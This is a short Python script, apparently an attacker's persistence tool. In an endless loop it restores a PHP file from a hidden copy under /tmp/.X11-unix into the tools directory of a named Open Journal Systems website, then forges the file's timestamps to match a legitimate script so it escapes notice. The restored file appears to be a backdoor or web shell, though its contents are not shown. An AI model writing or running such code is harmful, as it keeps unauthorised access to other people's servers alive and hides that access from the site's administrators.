import shutil
import os
import time

backup_php = "/tmp/.X11-unix/core_error_2025.php"
restore_to = "/mnt/BLOCKSTORAGE/home/897334.cloudwaysapps.com/hstrqcewky/public_html/ojs-3.4.0-8/tools/system.php"
timestamp_ref = "/mnt/BLOCKSTORAGE/home/897334.cloudwaysapps.com/hstrqcewky/public_html/ojs-3.4.0-8/tools/runScheduledTasks.php"

while True:
    try:
        if not os.path.exists(restore_to):
            shutil.copyfile(backup_php, restore_to)

            ref_stat = os.stat(timestamp_ref)
            os.utime(restore_to, (ref_stat.st_atime, ref_stat.st_mtime))

            print(f"[✓] Timestamp react.php disamakan dengan po.php => {time.ctime(ref_stat.st_mtime)}")

        time.sleep(10)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        time.sleep(10)
